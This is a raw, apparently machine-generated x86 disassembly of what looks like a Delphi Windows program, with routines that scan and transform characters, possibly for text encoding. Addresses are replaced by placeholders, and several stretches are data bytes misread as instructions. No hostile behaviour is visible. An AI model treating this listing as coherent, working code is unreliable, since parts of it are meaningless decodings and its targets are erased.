xor eax 0x35540040
bound ebp [ ebp - 0x10 ]
sti
inc edi
add [ ecx + esi * 8 ] bh
inc edi
add [ edx ] al
add [ esi ] dl
dec ecx
inc ebx
outsd
jb r-xdata
test edi edi
jle r-xdata
outsb
je r-xdata
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ecx edi
mov edx 0x1
mov eax esi
call sub_404638
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
call sub_404424
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fea5
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_40413c
retn
mov al [ esi + edi - 0x1 ]
add al 0xf7
sub al 0x2
jb r-xdata
mov edx r-xdata
cld
bound ebp [ ebp - 0x30 ]
cld
inc edi
add [ eax + esi * 8 + 0x20047 ] cl
push ss
dec ecx
inc ebx
outsd
jb r-xdata
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ edx + ebx + 0x42 ] bh
add [ ecx + eax + 0x54190048 ] al
dec ecx
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add ah bl
je r-xdata
mov bl [ esi + edi - 0x1 ]
mov eax ebx
sub al 0xa
je r-xdata
sub al 0x2
je r-xdata
call sub_40471c
test eax eax
jle r-xdata
jne r-xdata
add ah cl
push ds
push eax
jb r-xdata
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_404300
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov ecx 0x1
call sub_4046c0
sub al 0x3
jne r-xdata
sub al 0x13
je r-xdata
pop ecx
pop ecx
je r-xdata
outsb
je r-xdata
dec edi
mov [ fs : eax ] edx
push sub_47fddd
lea eax [ ebp - 0x4 ]
call sub_404118
retn
clc
dec [ ebx + 0x75 ]
les esi [ ebx ]
rcr [ edx + 0x59 ] 0x59
push eax
jb r-xdata
inc edx
add [ eax - 0x23ffbde3 ] bl
bound ebp [ ebp ]
outsb
je r-xdata
jne r-xdata
bound ebp [ ebp ]
sub_47fd64
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
xor eax eax
push ebp
push sub_47fdd6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fddd
lea eax [ ebp - 0x4 ]
call sub_404118
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi ]
mov dl [ edx ]
call sub_404300
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40471c
test eax eax
jle r-xdata
mov eax esi
mov ecx 0x1
mov edx 0x1
call sub_404678
dec ebx
jne r-xdata
mov eax [ esi ]
call sub_4043d8
test eax eax
jle r-xdata
sub_47fdf0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_47fe9e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_404764
mov eax esi
call sub_4043d8
mov edi eax
jmp r-xdata
test edi edi
jle r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ecx edi
mov edx 0x1
mov eax esi
call sub_404638
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
call sub_404424
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fea5
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_40413c
retn
mov al [ esi + edi - 0x1 ]
add al 0xf7
sub al 0x2
jb r-xdata
mov bl [ esi + edi - 0x1 ]
mov eax ebx
sub al 0xa
je r-xdata
sub al 0x2
je r-xdata
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_404300
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov ecx 0x1
call sub_4046c0
sub al 0x3
jne r-xdata
sub al 0x13
je r-xdata
dec edi
sub_47feac
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
call sub_4045c8
mov esi [ rw-data ]
xor eax eax
push ebp
push sub_48008b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
call sub_404118
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_47fdf0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4043d8
test eax eax
jg r-xdata
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_47423c
mov edx [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
call sub_4043e0
mov eax [ ebp - 0x4 ]
call sub_4043d8
test eax eax
jle r-xdata
mov eax [ ebp - 0xc ]
call sub_4043d8
test eax eax
jle r-xdata
lea eax [ ebp - 0x10 ]
call sub_404118
mov ebx 0x2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480092
lea eax [ ebp - 0x30 ]
mov edx 0xc
call sub_40413c
retn
mov eax [ ebp - 0xc ]
call sub_4043d8
push eax
lea eax [ ebp - 0xc ]
call j_sub_4045e4
mov edx eax
mov eax edi
pop ecx
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x10 ]
call sub_4043d8
test eax eax
jle r-xdata
lea eax [ ebp - 0x20 ]
push eax
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_4043e0
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_404678
dec ebx
jne r-xdata
push ebp
call sub_47fd64
pop ecx
lea eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
call sub_404424
mov eax [ ebp - 0x24 ]
call sub_408648
mov ebx eax
cmp bl 0x20
jne r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
mov dl [ edx ]
call sub_404300
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_408064
mov eax [ ebp - 0x18 ]
mov ecx [ esi ]
mov edx r-xdata
call ecx
test eax eax
je r-xdata
lea eax [ ebp - 0x30 ]
mov edx ebx
call sub_404300
mov edx [ ebp - 0x30 ]
lea eax [ ebp - 0xc ]
call sub_4043e0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4043d8
test eax eax
jle r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x4 ]
mov dl [ edx ]
call sub_404300
mov eax [ ebp - 0x28 ]
mov edx r-xdata
call sub_40471c
test eax eax
jle r-xdata
push [ ebp - 0xc ]
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_404300
push [ ebp - 0x2c ]
push r-xdata
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404498
push ebp
call sub_47fd64
pop ecx
jmp r-xdata
sub_4800dc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx r-xdata
call sub_4043e0
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
call sub_404118
pop ebp
retn
sub_48011c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_48016b
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
xor eax eax
mov al bl
mov edx 0x2
call sub_408620
mov ecx [ ebp - 0x4 ]
mov eax esi
mov edx r-xdata
call sub_404424
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480172
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_48017b
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] bh
mov ebp esp
push eax
mov eax 0x2
add esp 0xfffff004
push eax
dec eax
jne r-xdata
mov eax [ ebp - 0x4 ]
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x2028 ] ebx
mov [ ebp - 0x2024 ] ebx
mov [ ebp - 0x2020 ] ebx
mov [ ebp - 0x201c ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x18 ] ebx
mov ebx ecx
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_480422
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_4803ed
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp + 0x8 ]
call sub_404118
lea eax [ ebp - 0x4 ]
call sub_404118
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax [ ebp - 0xc ]
call sub_41b4f4
sub esi eax
mov [ ebp - 0x10 ] esi
cmp ebx [ ebp - 0x10 ]
jge r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
mov [ ebp - 0x10 ] ebx
mov eax [ ebp - 0x4 ]
call sub_4043d8
test eax eax
jle r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edi 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_4043d8
cmp edi eax
jge r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x14 ]
cmp eax 0x2000
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4803f4
lea eax [ ebp - 0x8 ]
call sub_40d814
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_4043d8
mov edx eax
sub edx edi
inc edx
mov eax [ ebp + 0x8 ]
mov ecx edi
call sub_404678
mov ebx eax
mov ebx 0x2000
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
jl r-xdata
mov edi 0x1
lea ebx [ ebp - 0x2018 ]
lea edx [ ebp - 0x2018 ]
mov ecx ebx
mov eax [ ebp - 0xc ]
mov esi [ eax ]
call [ esi + 0xc ]
add [ ebp - 0x14 ] ebx
mov esi ebx
test esi esi
jle r-xdata
cmp edi 0x2000
jge r-xdata
sub al 0x17
je r-xdata
lea eax [ ebp - 0x201c ]
mov dl [ ebx ]
call sub_404300
mov edx [ ebp - 0x201c ]
lea eax [ ebp - 0x4 ]
call sub_4043e0
jmp r-xdata
mov al [ ebx + 0x1 ]
sub al 0xa
je r-xdata
sub al 0x1d
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4043d8
cmp eax 0x47
jle r-xdata
lea edx [ ebp - 0x18 ]
mov al [ ebx ]
call sub_48011c
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
call sub_4043e0
jmp r-xdata
sub al 0x3
jne r-xdata
lea edx [ ebp - 0x18 ]
mov al [ ebx ]
call sub_48011c
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
call sub_4043e0
jmp r-xdata
jmp r-xdata
inc edi
inc ebx
dec esi
jne r-xdata
push ebp
call sub_4800dc
pop ecx
mov al [ ebx ]
cmp al 0x21
jb r-xdata
mov al [ ebx ]
sub al 0x9
je r-xdata
mov dl [ ebx ]
cmp dl 0x3e
jb r-xdata
cmp al 0x3c
jbe r-xdata
mov al [ ebx ]
sub al 0xa
je r-xdata
cmp dl 0x7e
ja r-xdata
lea eax [ ebp - 0x2020 ]
mov dl [ ebx ]
call sub_404300
mov edx [ ebp - 0x2020 ]
lea eax [ ebp - 0x4 ]
call sub_4043e0
jmp r-xdata
lea eax [ ebp - 0x2024 ]
mov dl [ ebx ]
call sub_404300
mov edx [ ebp - 0x2024 ]
lea eax [ ebp - 0x4 ]
call sub_4043e0
jmp r-xdata
sub al 0x3
jne r-xdata
lea edx [ ebp - 0x2028 ]
mov al [ ebx ]
call sub_48011c
mov edx [ ebp - 0x2028 ]
lea eax [ ebp - 0x4 ]
call sub_4043e0
sub_4803f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480429
lea eax [ ebp - 0x2028 ]
mov edx 0x4
call sub_40413c
lea eax [ ebp - 0x18 ]
call sub_404118
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_480434
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_480459
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480460
retn
sub_4806e8
pop eax
xor eax 0x355c0040
inc eax
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ ecx + edx ] bh
dec eax
add [ ecx + edx + 0x48 ] bh
add [ ecx ] bl
push esp
dec ecx
dec ebp
jae r-xdata
jmp r-xdata
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4807e5
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_40413c
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408248
test al al
je r-xdata
outsb
outsw
dec ebp
dec ecx
dec ebp
inc ebp
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_4807de
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x70 ]
call sub_483544
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404424
mov edx r-xdata
mov eax [ ebx + 0x44 ]
call sub_408248
test al al
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_480824
mov ebx eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4808ec
mov ebx eax
jmp r-xdata
mov edx r-xdata
mov eax [ ebx + 0x44 ]
call sub_408248
test al al
je r-xdata
xor ebx ebx
sub_480824
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4808b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
xor edx edx
mov eax esi
call sub_47ece4
mov eax edi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
add esp 0xfffffff0
call sub_403668
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4808bd
lea eax [ ebp - 0x4 ]
call sub_404118
retn
lea edx [ ebp - 0x4 ]
mov eax [ edi + 0x70 ]
call sub_483544
mov edx [ ebp - 0x4 ]
lea eax [ esi + 0x80 ]
call sub_40416c
cmp [ edi + 0x44 ] 0x0
je r-xdata
mov [ esi + 0x7c ] 0x0
mov eax [ edi + 0x44 ]
mov edx r-xdata
call sub_404524
je r-xdata
mov [ esi + 0x7c ] 0x1
jmp r-xdata
sub_4808bd
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4808ec
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0x8 ]
call sub_4045c8
xor eax eax
push ebp
push sub_480946
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
xor edx edx
mov eax edi
call sub_480824
lea eax [ edi + 0x78 ]
mov edx [ ebp + 0x8 ]
call sub_40416c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48094d
lea eax [ ebp + 0x8 ]
call sub_404118
retn
add esp 0xfffffff0
call sub_403668
sub_48096c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_480bd2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ esi ] 0x0
xor eax eax
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x7c ] 0x0
je r-xdata
lea ecx [ ebp - 0xc ]
mov eax [ ebx + 0x6c ]
mov edx r-xdata
call sub_41a68c
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
call sub_4041b0
jmp r-xdata
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_408248
test al al
je r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47faac
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_408248
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_421a7c
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_480ba8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x14 ]
mov edx [ ebx + 0x78 ]
call sub_4041b0
lea eax [ ebx + 0x78 ]
call sub_404118
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_47ed64
jmp r-xdata
mov ecx [ ebx + 0x80 ]
lea eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_404424
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_408248
test al al
je r-xdata
mov [ esi ] 0x1
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_404524
jne r-xdata
push r-xdata
push [ ebx + 0x80 ]
push r-xdata
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404498
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_408248
test al al
je r-xdata
mov ecx [ ebx + 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_480824
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480baf
lea eax [ ebp - 0x10 ]
call sub_40d814
retn
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4043d8
test eax eax
jle r-xdata
mov eax [ esi + 0x70 ]
call sub_483570
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_404424
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0x30 ]
jmp r-xdata
lea eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_4043e0
mov eax [ ebp - 0x14 ]
call sub_4043d8
push eax
lea eax [ ebp - 0x14 ]
call j_sub_4045e4
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_41b758
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x2e
jne r-xdata
cmp [ ebx + 0x78 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0x30 ]
jmp r-xdata
lea eax [ ebp - 0x14 ]
mov ecx 0x1
mov edx 0x1
call sub_404678
sub_480c58
push ebp
mov ebp esp
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
mov eax [ ebp - 0x8 ]
call sub_4045c8
xor eax eax
push ebp
push sub_480e46
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4041b0
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
mov cl 0x1
mov edx r-xdata
call sub_47423c
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
call sub_4041b0
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_408248
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x70 ] 0x2
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4041b0
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_408064
mov edx [ ebp - 0x18 ]
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov eax r-xdata
call ebx
mov ebx eax
test ebx ebx
jle r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_408064
mov edx [ ebp - 0x14 ]
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov eax r-xdata
call ebx
test eax eax
jle r-xdata
lea eax [ ebp - 0xc ]
call sub_404118
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0xc ]
call sub_4043d8
mov ecx eax
lea edx [ ebx + 0x9 ]
mov eax [ ebp - 0xc ]
call sub_404638
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x70 ] 0x1
mov eax [ ebp - 0xc ]
call sub_4043d8
test eax eax
jle r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4041b0
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
call sub_408064
mov edx [ ebp - 0x1c ]
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov eax r-xdata
call ebx
add eax 0x5
push eax
mov eax [ ebp - 0xc ]
call sub_4043d8
mov ecx eax
mov eax [ ebp - 0xc ]
pop edx
call sub_404638
mov eax [ ebp - 0xc ]
call sub_4043d8
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480e4d
lea eax [ ebp - 0x28 ]
mov edx 0xa
call sub_40413c
retn
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x22
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x68
mov edx [ ebp - 0xc ]
call sub_40416c
push 0x1
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0xc ]
mov cl 0x1
mov edx r-xdata
call sub_47423c
push 0x1
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0xc ]
mov cl 0x1
mov edx r-xdata
call sub_47423c
mov edx [ ebp - 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x68
call sub_40416c
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_47d5b4
mov edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x68
call sub_40416c
jmp r-xdata
sub_480e9b
inc [ ecx ]
add [ eax ] al
add [ edx ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4810c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_47ed64
mov eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_404524
jne r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x48 ]
mov eax [ eax + 0x40 ]
call sub_480c58
pop ecx
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4810cc
lea eax [ ebp - 0x30 ]
mov edx 0xb
call sub_40413c
retn
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov edx r-xdata
call sub_41a68c
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ r-xdata ]
call sub_483474
mov eax [ ebp - 0x8 ]
call sub_4043d8
test eax eax
jle r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
sub al 0x9
je r-xdata
push ebp
lea ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov edx r-xdata
call sub_41a68c
mov eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov edx r-xdata
call sub_41a68c
mov eax [ ebp - 0x30 ]
pop edx
call sub_480c58
pop ecx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
sub al 0x17
jne r-xdata
mov eax [ ebx + 0x70 ]
mov edx [ ebp - 0x8 ]
call sub_48357c
mov eax [ ebp - 0x4 ]
add eax 0x80
mov edx [ ebp - 0x8 ]
call sub_40416c
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx 0x7fffffff
mov edx 0x2
mov eax [ ebp - 0x10 ]
call sub_404638
mov eax [ ebp - 0x24 ]
mov ecx r-xdata
mov edx r-xdata
call sub_40d17c
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x6c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
dec edx
lea ecx [ ebp - 0x18 ]
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
push [ ebp - 0x18 ]
push r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov ecx 0x7fffffff
mov edx 0x2
mov eax [ ebp - 0x10 ]
call sub_404638
push [ ebp - 0x1c ]
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_404498
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
dec edx
mov eax ebx
pop ecx
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x10 ]
call sub_40d17c
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
sub_48113c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47ed7c
mov eax [ r-xdata ]
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_48117c
push ebx
mov ebx edx
mov eax [ ebx + 0x6c ]
cmp [ eax + 0x28 ] 0x0
jle r-xdata
cmp [ eax + 0x20 ] 0x0
jle r-xdata
lea eax [ ebx + 0x40 ]
mov edx r-xdata
call sub_40416c
pop ebx
retn
cmp [ eax + 0x2c ] 0x0
jle r-xdata
lea eax [ ebx + 0x40 ]
mov edx r-xdata
call sub_40416c
jmp r-xdata
pop ebx
retn
lea eax [ ebx + 0x40 ]
mov edx r-xdata
call sub_40416c
sub_4812c5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_4813c6
push [ fs : eax ]
mov [ fs : eax ] esp
